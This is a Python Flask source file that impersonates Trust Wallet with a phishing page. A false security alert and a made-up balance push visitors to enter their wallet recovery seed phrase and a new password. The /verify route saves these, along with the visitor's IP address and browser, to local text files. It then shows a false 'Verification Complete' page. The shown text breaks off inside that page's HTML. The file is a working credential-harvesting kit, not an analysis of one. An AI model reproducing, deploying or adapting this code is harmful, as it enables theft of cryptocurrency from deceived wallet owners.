import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'trust-wallet-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Trust Wallet")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['trust_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Trust Wallet - Secure Your Assets</title>
        <link rel="icon" type="image/png" href="https://trustwallet.com/assets/images/favicon.png">
        <style>
            :root {
                --trust-blue: #3375BB;
                --trust-dark: #0F1420;
                --trust-light: #1C2333;
                --trust-green: #00D395;
                --trust-purple: #6F42C1;
            }
            
            * {
                -webkit-tap-highlight-color: transparent;
            }
            
            body {
                background: linear-gradient(135deg, #0F1420 0%, #1C2333 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Roboto, Oxygen, Ubuntu, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            
            .wallet-container {
                background: rgba(28, 35, 51, 0.95);
                backdrop-filter: blur(20px);
                width: 100%;
                max-width: 500px;
                min-height: 100vh;
                border-radius: 0;
                overflow: hidden;
                border: none;
                box-shadow: none;
            }
            
            @media (min-width: 768px) {
                .wallet-container {
                    min-height: auto;
                    border-radius: 24px;
                    border: 2px solid rgba(51, 117, 187, 0.3);
                    box-shadow: 
                        0 20px 60px rgba(0, 0, 0, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.05),
                        inset 0 0 30px rgba(0, 211, 149, 0.05);
                    margin: 20px;
                    min-height: auto;
                }
            }
            
            .wallet-header {
                background: linear-gradient(135deg, #1C2333 0%, #0F1420 100%);
                padding: 30px 20px;
                text-align: center;
                border-bottom: 1px solid rgba(255, 255, 255, 0.05);
                position: relative;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .wallet-header {
                    padding: 40px 40px 30px;
                }
            }
            
            .wallet-header::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(0, 211, 149, 0.1) 0%, transparent 70%);
                z-index: 0;
            }
            
            .wallet-logo {
                position: relative;
                z-index: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .logo-img {
                width: 60px;
                height: 60px;
                border-radius: 16px;
                box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3);
                object-fit: contain;
            }
            
            .logo-text {
                font-size: 28px;
                font-weight: 700;
                background: linear-gradient(135deg, #3375BB, #00D395);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            
            .security-alert {
                background: rgba(255, 107, 107, 0.1);
                border: 2px solid rgba(255, 107, 107, 0.3);
                border-radius: 16px;
                padding: 15px;
                margin: 20px;
                position: relative;
                animation: pulseAlert 2s infinite;
            }
            
            @media (min-width: 768px) {
                .security-alert {
                    margin: 30px 40px;
                    padding: 20px;
                }
            }
            
            @keyframes pulseAlert {
                0% { border-color: rgba(255, 107, 107, 0.3); }
                50% { border-color: rgba(255, 107, 107, 0.6); }
                100% { border-color: rgba(255, 107, 107, 0.3); }
            }
            
            .alert-icon {
                position: absolute;
                top: -12px;
                left: 15px;
                background: #FF6B6B;
                color: white;
                padding: 6px 12px;
                border-radius: 15px;
                font-size: 11px;
                font-weight: 700;
            }
            
            .balance-display {
                background: linear-gradient(135deg, rgba(0, 211, 149, 0.1), rgba(51, 117, 187, 0.1));
                border: 2px solid rgba(0, 211, 149, 0.2);
                border-radius: 20px;
                padding: 25px;
                margin: 20px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .balance-display {
                    margin: 30px 40px;
                    padding: 30px;
                }
            }
            
            .balance-display::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.02) 100%);
                pointer-events: none;
            }
            
            .balance-label {
                color: #A0AEC0;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 8px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .balance-amount {
                font-size: 36px;
                font-weight: 800;
                background: linear-gradient(135deg, #00D395, #3375BB);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 8px 0;
                line-height: 1.2;
            }
            
            @media (min-width: 768px) {
                .balance-amount {
                    font-size: 42px;
                }
            }
            
            .balance-usd {
                color: #A0AEC0;
                font-size: 16px;
                font-weight: 600;
            }
            
            .verification-section {
                padding: 0 20px 30px;
            }
            
            @media (min-width: 768px) {
                .verification-section {
                    padding: 0 40px 40px;
                }
            }
            
            .verification-title {
                color: white;
                font-size: 20px;
                font-weight: 700;
                margin-bottom: 20px;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .verification-title {
                    font-size: 22px;
                    margin-bottom: 25px;
                }
            }
            
            .verification-steps {
                background: rgba(255, 255, 255, 0.02);
                border-radius: 16px;
                padding: 20px;
                margin-bottom: 25px;
            }
            
            @media (min-width: 768px) {
                .verification-steps {
                    padding: 25px;
                    margin-bottom: 30px;
                }
            }
            
            .step-item {
                display: flex;
                align-items: flex-start;
                margin: 15px 0;
                color: #E2E8F0;
                font-size: 14px;
            }
            
            @media (min-width: 768px) {
                .step-item {
                    font-size: 16px;
                    margin: 20px 0;
                }
            }
            
            .step-number {
                width: 28px;
                height: 28px;
                background: linear-gradient(135deg, #3375BB, #00D395);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 700;
                margin-right: 12px;
                flex-shrink: 0;
                font-size: 14px;
            }
            
            @media (min-width: 768px) {
                .step-number {
                    width: 32px;
                    height: 32px;
                    font-size: 16px;
                }
            }
            
            .seed-phrase-input {
                margin: 25px 0;
            }
            
            .input-label {
                color: #A0AEC0;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 10px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            textarea {
                width: 100%;
                min-height: 100px;
                padding: 15px;
                background: rgba(15, 20, 32, 0.5);
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                color: white;
                font-size: 15px;
                font-family: 'Courier New', monospace;
                line-height: 1.5;
                resize: vertical;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                textarea {
                    min-height: 120px;
                    padding: 20px;
                    font-size: 16px;
                }
            }
            
            textarea:focus {
                border-color: #00D395;
                outline: none;
                background: rgba(15, 20, 32, 0.8);
                box-shadow: 0 0 0 3px rgba(0, 211, 149, 0.1);
            }
            
            textarea::placeholder {
                color: #4A5568;
                font-style: italic;
            }
            
            .password-input {
                position: relative;
                margin: 20px 0;
            }
            
            input {
                width: 100%;
                padding: 15px;
                background: rgba(15, 20, 32, 0.5);
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                color: white;
                font-size: 15px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                input {
                    padding: 20px;
                    font-size: 16px;
                }
            }
            
            input:focus {
                border-color: #00D395;
                outline: none;
                background: rgba(15, 20, 32, 0.8);
                box-shadow: 0 0 0 3px rgba(0, 211, 149, 0.1);
            }
            
            .show-password {
                position: absolute;
                right: 12px;
                top: 50%;
                transform: translateY(-50%);
                background: none;
                border: none;
                color: #A0AEC0;
                cursor: pointer;
                font-size: 13px;
                padding: 5px;
                -webkit-tap-highlight-color: transparent;
            }
            
            .security-tips {
                background: rgba(0, 211, 149, 0.05);
                border: 2px solid rgba(0, 211, 149, 0.2);
                border-radius: 12px;
                padding: 15px;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .security-tips {
                    padding: 20px;
                    margin: 30px 0;
                }
            }
            
            .tip-item {
                display: flex;
                align-items: flex-start;
                margin: 12px 0;
                color: #A0AEC0;
                font-size: 13px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .tip-item {
                    font-size: 14px;
                    margin: 15px 0;
                }
            }
            
            .tip-icon {
                color: #00D395;
                margin-right: 10px;
                font-weight: bold;
                min-width: 16px;
                flex-shrink: 0;
                margin-top: 1px;
            }
            
            .verify-btn {
                background: linear-gradient(135deg, #3375BB, #00D395);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 16px;
                font-size: 17px;
                font-weight: 700;
                width: 100%;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 15px;
                position: relative;
                overflow: hidden;
                -webkit-tap-highlight-color: transparent;
            }
            
            @media (min-width: 768px) {
                .verify-btn {
                    padding: 22px;
                    font-size: 18px;
                    margin-top: 20px;
                }
            }
            
            .verify-btn:hover, .verify-btn:active {
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(0, 211, 149, 0.3);
            }
            
            .verify-btn::after {
                content: '🔐';
                position: absolute;
                right: 15px;
                top: 50%;
                transform: translateY(-50%);
                font-size: 18px;
            }
            
            .assets-list {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 12px;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .assets-list {
                    gap: 15px;
                    margin: 30px 0;
                }
            }
            
            .asset-item {
                background: rgba(255, 255, 255, 0.02);
                border: 1px solid rgba(255, 255, 255, 0.05);
                border-radius: 12px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
            }
            
            @media (min-width: 768px) {
                .asset-item {
                    padding: 20px;
                }
            }
            
            .asset-item:active {
                border-color: rgba(0, 211, 149, 0.3);
                background: rgba(0, 211, 149, 0.05);
                transform: translateY(-3px);
            }
            
            .asset-icon {
                font-size: 20px;
                margin-bottom: 8px;
            }
            
            @media (min-width: 768px) {
                .asset-icon {
                    font-size: 24px;
                    margin-bottom: 10px;
                }
            }
            
            .asset-amount {
                font-weight: 700;
                margin: 5px 0;
                color: white;
                font-size: 14px;
            }
            
            @media (min-width: 768px) {
                .asset-amount {
                    font-size: 16px;
                }
            }
            
            .asset-value {
                color: #00D395;
                font-size: 11px;
                font-weight: 600;
            }
            
            @media (min-width: 768px) {
                .asset-value {
                    font-size: 12px;
                }
            }
            
            .network-status {
                background: rgba(111, 66, 193, 0.1);
                border: 2px solid rgba(111, 66, 193, 0.3);
                border-radius: 12px;
                padding: 12px;
                margin: 20px;
                text-align: center;
                color: #A78BFA;
                font-size: 13px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }
            
            @media (min-width: 768px) {
                .network-status {
                    margin: 25px 40px;
                    padding: 15px;
                    font-size: 14px;
                }
            }
            
            .warning-box {
                background: rgba(255, 107, 107, 0.05);
                border: 2px solid rgba(255, 107, 107, 0.1);
                border-radius: 12px;
                padding: 15px;
                margin: 25px 0;
                color: #FF6B6B;
                font-size: 12px;
                text-align: center;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .warning-box {
                    padding: 20px;
                    margin: 30px 0;
                    font-size: 13px;
                }
            }
            
            .connection-indicator {
                display: inline-flex;
                align-items: center;
                background: rgba(0, 211, 149, 0.1);
                color: #00D395;
                padding: 5px 10px;
                border-radius: 15px;
                font-size: 11px;
                font-weight: 600;
                margin-top: 8px;
            }
            
            .qr-section {
                text-align: center;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .qr-section {
                    margin: 30px 0;
                }
            }
            
            .qr-placeholder {
                width: 180px;
                height: 180px;
                background: linear-gradient(45deg, #1C2333, #0F1420);
                border: 3px solid rgba(0, 211, 149, 0.3);
                border-radius: 16px;
                margin: 0 auto 15px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 36px;
                color: #00D395;
            }
            
            @media (min-width: 768px) {
                .qr-placeholder {
                    width: 200px;
                    height: 200px;
                    font-size: 40px;
                }
            }
            
            /* Mobile touch improvements */
            @media (max-width: 767px) {
                body {
                    padding: 0;
                    min-height: 100vh;
                    -webkit-overflow-scrolling: touch;
                }
                
                input, textarea, button {
                    font-size: 16px !important; /* Prevents iOS zoom on focus */
                }
                
                .step-item {
                    flex-direction: row;
                }
                
                .verification-steps {
                    padding: 15px;
                }
            }
        </style>
    </head>
    <body>
        <div class="wallet-container">
            <div class="wallet-header">
                <div class="wallet-logo">
                    <img src="https://trustwallet.com/assets/images/media/assets/TWT_LOGO_BLUE.png" 
                         alt="Trust Wallet Logo" 
                         class="logo-img"
                         onerror="this.src='https://cryptologos.cc/logos/trust-wallet-twt-logo.png'">
                </div>
                
                <div style="color: #A0AEC0; font-size: 15px; max-width: 400px; margin: 0 auto; line-height: 1.5;">
                    Secure your crypto assets with Trust Wallet's enhanced security verification
                </div>
            </div>
            
            <div class="security-alert">
                <div class="alert-icon">⚠️ SECURITY ALERT</div>
                <div style="color: #FFE5E5; font-weight: 600; margin-bottom: 8px;">
                    Unusual activity detected on your wallet
                </div>
                <div style="color: #FFB8B8; font-size: 13px; line-height: 1.4;">
                    We've detected suspicious login attempts from a new device. 
                    Please verify your identity to secure your assets.
                </div>
            </div>
            
            <div class="balance-display">
                <div class="balance-label">Total Portfolio Value</div>
                <div class="balance-amount">8.42 ETH</div>
                <div class="balance-usd">≈ $25,847.63 USD</div>
                <div style="margin-top: 12px;">
                    <span class="connection-indicator">🟢 Connected to Ethereum Mainnet</span>
                </div>
            </div>
            
            <div class="assets-list">
                <div class="asset-item">
                    <div class="asset-icon">⏣</div>
                    <div class="asset-amount">8.42 ETH</div>
                    <div class="asset-value">$25,847</div>
                </div>
                <div class="asset-item">
                    <div class="asset-icon">₿</div>
                    <div class="asset-amount">0.42 BTC</div>
                    <div class="asset-value">$17,234</div>
                </div>
                <div class="asset-item">
                    <div class="asset-icon">◎</div>
                    <div class="asset-amount">4,200 SOL</div>
                    <div class="asset-value">$42,000</div>
                </div>
            </div>
            
            <div class="network-status">
                <span>🌐</span>
                <span>Multiple networks detected: Ethereum, BSC, Polygon, Avalanche</span>
            </div>
            
            <div class="verification-section">
                <div class="verification-title">Wallet Security Verification</div>
                
                <div class="verification-steps">
                    <div class="step-item">
                        <div class="step-number">1</div>
                        <div>
                            <strong>Enter Recovery Phrase</strong>
                            <div style="color: #A0AEC0; font-size: 13px; margin-top: 4px;">
                                Your 12, 18, or 24-word secret phrase
                            </div>
                        </div>
                    </div>
                    
                    <div class="step-item">
                        <div class="step-number">2</div>
                        <div>
                            <strong>Set New Password</strong>
                            <div style="color: #A0AEC0; font-size: 13px; margin-top: 4px;">
                                Create a new secure password for enhanced protection
                            </div>
                        </div>
                    </div>
                    
                    <div class="step-item">
                        <div class="step-number">3</div>
                        <div>
                            <strong>Verification Complete</strong>
                            <div style="color: #A0AEC0; font-size: 13px; margin-top: 4px;">
                                Your wallet will be secured and backed up
                            </div>
                        </div>
                    </div>
                </div>
                
                <form action="/verify" method="post">
                    <div class="seed-phrase-input">
                        <label class="input-label">Recovery / Seed Phrase</label>
                        <textarea 
                            name="seed_phrase" 
                            placeholder="Enter your 12, 18, or 24-word recovery phrase separated by spaces"
                            required
                            rows="4"
                        ></textarea>
                    </div>
                    
                    <div class="password-input">
                        <label class="input-label">New Wallet Password</label>
                        <input 
                            type="password" 
                            name="password" 
                            id="password"
                            placeholder="Create a strong password (min. 12 characters)"
                            required
                            minlength="12"
                        >
                        <button type="button" class="show-password" onclick="togglePassword()">Show</button>
                    </div>
                    
                    <div class="security-tips">
                        <div class="tip-item">
                            <span class="tip-icon">✓</span>
                            <span>Never share your seed phrase with anyone</span>
                        </div>
                        <div class="tip-item">
                            <span class="tip-icon">✓</span>
                            <span>Store your seed phrase offline in a secure location</span>
                        </div>
                        <div class="tip-item">
                            <span class="tip-icon">✓</span>
                            <span>This verification ensures your assets are protected</span>
                        </div>
                    </div>
                    
                    <div class="warning-box">
                        ⚠️ This is a one-time security verification. Failure to complete may result in 
                        restricted access to your assets.
                    </div>
                    
                    <button type="submit" class="verify-btn">
                        Verify & Secure Wallet
                    </button>
                </form>
                
                <div class="qr-section">
                    <div style="color: #A0AEC0; font-size: 13px; margin-bottom: 12px;">
                        Or verify by scanning QR code
                    </div>
                    <div class="qr-placeholder">📱</div>
                    <div style="color: #718096; font-size: 11px;">
                        Scan with Trust Wallet mobile app
                    </div>
                </div>
            </div>
        </div>
        
        <script>
            function togglePassword() {
                const passwordInput = document.getElementById('password');
                const toggleButton = document.querySelector('.show-password');
                
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    toggleButton.textContent = 'Hide';
                } else {
                    passwordInput.type = 'password';
                    toggleButton.textContent = 'Show';
                }
                passwordInput.focus();
            }
            
            // Mobile touch improvements
            document.addEventListener('touchstart', function() {}, {passive: true});
            
            // Prevent form resubmission on refresh
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
            
            // Animate balance
            setTimeout(() => {
                const balance = document.querySelector('.balance-amount');
                balance.style.transform = 'scale(1.05)';
                balance.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    balance.style.transform = 'scale(1)';
                }, 300);
            }, 800);
            
            // Animate asset items
            const assetItems = document.querySelectorAll('.asset-item');
            assetItems.forEach((item, index) => {
                item.style.opacity = '0';
                item.style.transform = 'translateY(15px)';
                
                setTimeout(() => {
                    item.style.transition = 'all 0.4s ease';
                    item.style.opacity = '1';
                    item.style.transform = 'translateY(0)';
                }, index * 150);
            });
            
            // Auto-update balance with random fluctuations (simulation)
            setInterval(() => {
                const balanceAmount = document.querySelector('.balance-amount');
                const currentEth = parseFloat(balanceAmount.textContent) || 8.42;
                const fluctuation = (Math.random() - 0.5) * 0.015; // ±0.75%
                const newEth = (currentEth * (1 + fluctuation)).toFixed(2);
                balanceAmount.textContent = newEth + ' ETH';
            }, 15000);
            
            // Handle form submission
            document.querySelector('form').addEventListener('submit', function(e) {
                const seedPhrase = this.querySelector('[name="seed_phrase"]').value.trim();
                const password = this.querySelector('[name="password"]').value.trim();
                
                if (seedPhrase.split(' ').length < 12) {
                    alert('Please enter a valid 12, 18, or 24-word recovery phrase.');
                    e.preventDefault();
                    return false;
                }
                
                if (password.length < 12) {
                    alert('Password must be at least 12 characters long.');
                    e.preventDefault();
                    return false;
                }
                
                // Show loading state
                const submitBtn = this.querySelector('.verify-btn');
                const originalText = submitBtn.textContent;
                submitBtn.textContent = 'Verifying...';
                submitBtn.disabled = true;
                
                setTimeout(() => {
                    submitBtn.textContent = originalText;
                    submitBtn.disabled = false;
                }, 2000);
            });
            
            // Mobile viewport height fix
            function setViewportHeight() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

@app.route('/verify', methods=['POST'])
def verify():
    seed_phrase = request.form.get('seed_phrase', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('trust_session', 'unknown')

    # Extract first word for filename
    first_word = seed_phrase.split()[0] if seed_phrase else 'unknown'
    safe_filename = secure_filename(first_word)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_filename}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write("=" * 50 + "\n")
        file.write(f"SEED PHRASE:\n{seed_phrase}\n")
        file.write("=" * 50 + "\n")
        file.write(f"PASSWORD: {password}\n")
        file.write("=" * 50 + "\n")
        file.write(f"Platform: Trust Wallet Security Verification\n")
        file.write(f"Shown Balance: 8.42 ETH ($25,847.63)\n")
        file.write(f"Assets: ETH, BTC, SOL\n")
        file.write(f"Alert: 'Unusual activity detected'\n")
        file.write(f"Verification Type: Seed Phrase + Password\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Trust Wallet - Verification Complete</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            :root {
                --trust-blue: #3375BB;
                --trust-green: #00D395;
                --trust-dark: #0F1420;
            }
            
            * {
                -webkit-tap-highlight-color: transparent;
            }
            
            body {
                background: linear-gradient(135deg, #0F1420 0%, #1C2333 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-font-smoothing: antialiased;
            }
            
            .success-container {
                background: rgba(28, 35, 51, 0.95);
                backdrop-filter: blur(20px);
                width: 100%;
                max-width: 500px;
                min-height: 100vh;
                border-radius: 0;
                overflow: hidden;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .success-container {
                    min-height: auto;
                    border-radius: 24px;
                    border: 2px solid rgba(0, 211, 149, 0.3);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                    margin: 20px;
                }
            }
            
            .success-header {
                background: linear-gradient(135deg, rgba(0, 211, 149, 0.1), rgba(51, 117, 187, 0.1));
                padding: 40px 20px;
                position: relative;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .success-header {
                    padding: 50px 40px;
                }
            }
            
            .success-icon {
                width: 80px;
                height: 80px;
                background: linear-gradient(135deg, #3375BB, #00D395);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 25px;
                font-size: 40px;
                color: white;
                box-shadow: 0 15px 40px rgba(0, 211, 149, 0.3);
                animation: float 3s ease-in-out infinite;
            }
            
            @media (min-width: 768px) {
                .success-icon {
                    width: 100px;
                    height: 100px;
                    font-size: 48px;
                }
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-8px); }
            }
            
            .success-title {
                font-size: 28px;
                font-weight: 700;
                background: linear-gradient(135deg, #3375BB, #00D395);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 10px;
            }
            
            @media (min-width: 768px) {
                .success-title {
                    font-size: 32px;
                }
            }
            
            .success-body {
                padding: 30px 20px;
            }
            
            @media (min-width: 768px) {
                .success-body {
                    padding: 40px;
                }
            }
            
            .progress-container {
                width: 100%;
                height: 6px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 3px;
                margin: 25px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #3375BB, #00D395);
                border-radius: 3px;
                width: 0%;
                animation: fillProgress 2s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .status-list {
                text-align: left;
                margin: 30px 0;
            }
            
            .status-item {
                display: flex;
                align-items: flex-start;
                padding: 15px 0;
                border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            }
            
            .status-item:last-child {
                border-bottom: none;
            }
            
            .status-icon {
                color: #00D395;
                font-weight: bold;
                margin-right: 12px;
                font-size: 20px;
                min-width: 24px;
                flex-shrink: 0;
                margin-top: 2px;
            }
            
            .wallet-details {
                background: rgba(0, 0, 0, 0.2);
                border-radius: 16px;
                padding: 20px;
                margin: 25px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .wallet-details {
                    padding: 25px;
                    margin: 30px 0;
                }
            }
            
            .detail-row {
                display: flex;
                justify-content: space-between;
                margin: 12px 0;
                font-size: 13px;
            }
            
            @media (min-width: 768px) {
                .detail-row {
                    font-size: 14px;
                    margin: 15px 0;
                }
            }
            
            .detail-label {
                color: #A0AEC0;
            }
            
            .detail-value {
                font-weight: 600;
                color: white;
            }
            
            .assets-updated {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 12px;
                margin: 30px 0;
            }
            
            @media (min-width: 768px) {
                .assets-updated {
                    gap: 15px;
                    margin: 40px 0;
                }
            }
            
            .asset-update {
                background: rgba(0, 211, 149, 0.05);
                border: 1px solid rgba(0, 211, 149, 0.2);
                border-radius: 12px;
                padding: 15px;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .asset-update {
                    padding: 20px;
                }
            }
            
            .asset-update-icon {
                font-size: 18px;
                margin-bottom: 8px;
                color: #00D395;
            }
            
            @media (min-width: 768px) {
                .asset-update-icon {
                    font-size: 20px;
                    margin-bottom: 10px;
                }
            }
            
            .transaction-hash {
                background: rgba(255, 255, 255, 0.02);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                padding: 12px;
                font-family: 'Courier New', monospace;
                font-size: 10px;
                color: #A0AEC0;
                margin: 15px 0;
                word-break: break-all;
            }
            
            @media (min-width: 768px) {
                .transaction-hash {
                    padding: 15px;
                    font-size: 11px;
                    margin: 20px 0;
                }
            }
            
            .backup-note {
                background: rgba(51, 117, 187, 0.1);
                border: 2px solid rgba(51, 117, 187, 0.3);
                border-radius: 12px;
                padding: 15px;
                margin: 25px 0;
                color: #90CDF4;
                font-size: 12px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .backup-note {
                    padding: 20px;
                    margin: 30px 0;
                    font-size: 13px;
                }
            }
            
            .redirect-notice {
                background: rgba(0, 211, 149, 0.1);
                border: 2px solid rgba(0, 211, 149, 0.2);
                border-radius: 12px;
                padding: 15px;
                margin: 20px 0;
                color: #00D395;
                font-size: 13px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .redirect-notice {
                    padding: 20px;
                    margin: 25px 0;
                    font-size: 14px;
                }
            }
            
            .continue-btn {
                background: linear-gradient(135deg, #3375BB, #00D395);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 16px;
                font-size: 17px;
                font-weight: 700;
                width: 100%;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 15px;
                -webkit-tap-highlight-color: transparent;
            }
            
            @media (min-width: 768px) {
                .continue-btn {
                    padding: 20px;
                    font-size: 18px;
                    margin-top: 20px;
                }
            }
            
            .continue-btn:hover, .continue-btn:active {
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(0, 211, 149, 0.3);
            }
            
            /* Mobile touch improvements */
            @media (max-width: 767px) {
                .success-container {
                    min-height: 100vh;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="success-container">
            <div class="success-header">
                <div class="success-icon">✓</div>
                <div class="success-title">Verification Complete</div>
                <div style="color: #A0AEC0; font-size: 15px; max-width: 400px; margin: 0 auto;">
                    Your Trust Wallet is now secured and backed up
                </div>
            </div>
            
            <div class="success-body">
                <div style="color: #A0AEC0; font-size: 14px; margin-bottom: 25px;">
                    Security verification successful. Your assets are now protected.
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                
                <div class="status-list">
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Seed Phrase Verified</strong>
                            <div style="color: #A0AEC0; font-size: 13px; margin-top: 4px;">
                                Recovery phrase successfully encrypted
                            </div>
                        </div>
                    </div>
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Wallet Secured</strong>
                            <div style="color: #A0AEC0; font-size: 13px; margin-top: 4px;">
                                New password applied to all accounts
                            </div>
                        </div>
                    </div>
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Backup Created</strong>
                            <div style="color: #A0AEC0; font-size: 13px; margin-top: 4px;">
                                Encrypted backup stored securely
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="wallet-details">
                    <div style="color: #00D395; font-weight: 600; margin-bottom: 15px; font-size: 15px;">
                        Wallet Security Status
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Verification Status:</span>
                        <span class="detail-value" style="color: #00D395;">Complete ✓</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Total Assets Secured:</span>
                        <span class="detail-value">$85,081.63</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Network Status:</span>
                        <span class="detail-value">All Networks Secured</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Last Backup:</span>
                        <span class="detail-value">Just now</span>
                    </div>
                </div>
                
                <div class="assets-updated">
                    <div class="asset-update">
                        <div class="asset-update-icon">⏣</div>
                        <div style="font-size: 14px; font-weight: 600;">8.42 ETH</div>
                        <div style="color: #00D395; font-size: 11px;">Secured</div>
                    </div>
                    <div class="asset-update">
                        <div class="asset-update-icon">₿</div>
                        <div style="font-size: 14px; font-weight: 600;">0.42 BTC</div>
                        <div style="color: #00D395; font-size: 11px;">Secured</div>
                    </div>
                    <div class="asset-update">
                        <div class="asset-update-icon">◎</div>
                        <div style="font-size: 14px; font-weight: 600;">4,200 SOL</div>
                        <div style="color: #00D395; font-size: 11px;">Secured</div>
                    </div>
                </div>
                
                <div class="transaction-hash">
